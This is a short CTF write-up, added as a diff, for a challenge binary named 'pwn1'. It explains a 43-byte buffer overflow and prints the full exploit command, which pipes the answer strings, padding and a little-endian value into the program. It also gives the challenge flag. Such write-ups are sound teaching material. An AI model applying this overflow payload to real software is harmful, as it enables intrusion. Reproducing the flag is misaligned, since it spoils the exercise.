@@ -1,0 +1,11 @@
+=== Personal solution description ===
+
+This one was pretty easy. If only it didn't take me literally 5 minutes to realise the secret was "0xdea110c8" and not "0xdeall0c8". I have no idea where my mind was at considering hex goes from 0-9a-f but...
+
+So simply noticing the overflow, just like in the previous "boi" binary, is pretty much enough to beat this. The buffer has 43 bytes, so just craft a payload and get going:
+
+$ echo -e "Sir Lancelot of Camelot\nTo seek the Holy Grail.\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xc8\x10\xa1\xde" | ./pwn1
+
+Don't forget about little-endian on Intel CPUs.
+
+Flag is: flag{g0ttem_b0yz}
